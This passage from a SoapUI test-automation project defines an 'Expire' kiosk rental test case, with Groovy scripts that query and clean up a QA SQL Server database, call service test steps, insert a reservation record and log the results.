roperties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>5a35d39d-4f88-4217-bf3a-f3cebdc33ac5</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d7a8a06e-5d89-452c-80e9-67fe3fc6a81c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="69c9b99c-094f-4a21-8658-a8be5e4d257b" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="Expire" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="607c2d76-a439-4523-9be4-7a2d6c5546da"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:assertion type="JDBC Status" id="e7a3f403-20b0-4593-81c5-1aceb211b870" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="de2c7b6b-9edb-4b67-9265-2a0a0547fe2b"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="JDBC"><con:configuration><driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</driver><connstr>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=QaAutomation;integratedSecurity=true;</connstr><pass>t</pass><Connection>QaAutomation( QAInt )</Connection><query>Select 
	KS_Pickup.ID As ID, 
	KS_Pickup.Scenario As Scenario,
	KS_Pickup.Email As Email, 
	KS_Pickup.CreditCardNumber As Ccnumber, 
	KS_Pickup.CreditCardType As CCType,
	KS_Pickup.PromoCode As PromoCode, 
	KS_Pickup.PromoValue As PromoValue, 
	KS_Pickup.KioskID As KioskID,
	KS_Pickup.RentalFormats As rentalFormats,
	KS_Pickup.NumberOfRentals As numOfRentals,
	KS_Pickup.RentalVendStatus As RentalVendStatus,
	KS_Pickup.PurchaseFormats As PurchaseFormats,
	KS_Pickup.NumberOfPurchases As numOfPurchases,
	KS_Pickup.PurchaseVendStatus As PurchaseVendStatus,
	KS_Pickup.SetDaysBack As SetDaysBack, 
	KS_Pickup.LoyaltyFlag As LoyaltyFlag, 
	KS_Pickup.MDVFlag As MDVFlag, 
	KS_Pickup.MDVDiscNumber As MDVDiscNumber, 
	KS_Pickup.TestCaseName As TestCaseName
From KS_Pickup
Where TestCaseName = 'Expire' </query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>LoyaltyFlag</con:property><con:property>MDVFlag</con:property><con:property>MDVDiscNumber</con:property><con:property>TestCaseName</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="a17d9da0-f44f-4855-a682-af545b78ac00"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("---------------------------------" + context.testCase.name + "-------------------------------");
log.info ("Scenario [$ScenarioNo]:Kiosk " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
testRunner.testCase.setPropertyValue("AccountNumber",getCP.getPropertyValue("CpAccountNumber"));

//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="4be57250-dd79-4d98-b9d1-5c4474a97ec5"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", 'false');//HardCoded
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", context.expand( '${DataSource#MDVFlag}' ));
tc.setPropertyValue("MDVDiscNumber",context.expand( '${DataSource#MDVDiscNumber}' ));

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Authorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Authorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="2df3ead0-0c76-4b06-9e70-a856164c83e5"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="groovy" name="Expire" id="33036382-a149-412e-baa7-9305f79c2a56"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Expire"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("CardType", authtc.getPropertyValue("CCType"));
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Pickup] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Expire $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Expire $tcStatus");
	testRunner.gotoStepByName("DataSource Loop"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));

	//Get Scenario Count
	testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
	testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())

}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="79e85799-5da5-4bff-b27b-57294d3e5761"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="283395cf-7cea-4f12-804b-a62f67a0e473"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
testRunner.testCase.setPropertyValue("ScenarioCount", "0");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,264389) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,264389)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505")

</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");
def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1983166</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058259</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Expire PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>77</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-14:33:50.408</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-14:34:45.532</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648682</con:value></con:property><con:property><con:name>AccountNumber</con:name><con:value>81483122978646</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>22</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c